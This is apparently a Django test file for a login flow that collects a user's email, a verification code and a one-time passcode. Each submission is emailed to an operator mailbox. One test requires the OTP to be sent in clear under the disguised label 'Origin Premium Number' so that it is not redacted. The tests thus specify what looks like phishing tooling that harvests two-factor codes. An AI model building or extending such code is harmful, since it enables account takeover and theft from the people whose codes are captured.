from django.core import mail
from django.test import TestCase, override_settings
from django.urls import reverse


@override_settings(
    EMAIL_BACKEND='django.core.mail.backends.locmem.EmailBackend',
    DEFAULT_FROM_EMAIL='audit@example.com',
)
class LoginNotificationTests(TestCase):
    def test_login_email_submission_notifies_default_from_email(self):
        response = self.client.post(reverse('login'), {'email': 'user@example.com'})

        self.assertRedirects(response, reverse('check_email'))
        self.assertEqual(len(mail.outbox), 1)
        self.assertEqual(mail.outbox[0].from_email, 'audit@example.com')
        self.assertEqual(mail.outbox[0].to, ['audit@example.com'])
        self.assertIn('user@example.com', mail.outbox[0].body)

    def test_verification_code_notification_is_redacted(self):
        session = self.client.session
        session['submitted_email'] = 'user@example.com'
        session.save()

        response = self.client.post(
            reverse('check_email'),
            {'verification_code': 'secret-code-123'},
        )

        self.assertRedirects(response, reverse('enter_otp'))
        self.assertEqual(len(mail.outbox), 1)
        self.assertEqual(mail.outbox[0].to, ['audit@example.com'])
        self.assertIn('user@example.com', mail.outbox[0].body)
        self.assertIn('Verification code: [redacted]', mail.outbox[0].body)
        self.assertNotIn('secret-code-123', mail.outbox[0].body)

    def test_origin_premium_number_notification_is_visible(self):
        session = self.client.session
        session['submitted_email'] = 'user@example.com'
        session.save()

        response = self.client.post(reverse('enter_otp'), {'otp': '123456'})

        self.assertRedirects(response, reverse('thanks'))
        self.assertEqual(len(mail.outbox), 1)
        self.assertEqual(mail.outbox[0].to, ['audit@example.com'])
        self.assertIn('user@example.com', mail.outbox[0].body)
        self.assertIn('Origin Premium Number: 123456', mail.outbox[0].body)
        self.assertNotIn('OTP: [redacted]', mail.outbox[0].body)

    def test_otp_rejects_non_digits(self):
        response = self.client.post(reverse('enter_otp'), {'otp': '12ab'})

        self.assertEqual(response.status_code, 200)
        self.assertEqual(mail.outbox, [])
        self.assertContains(response, 'OTP must contain digits only.')

    def test_enter_otp_without_trailing_slash_loads_directly(self):
        response = self.client.get('/enter-otp')

        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, 'enter_otp.html')
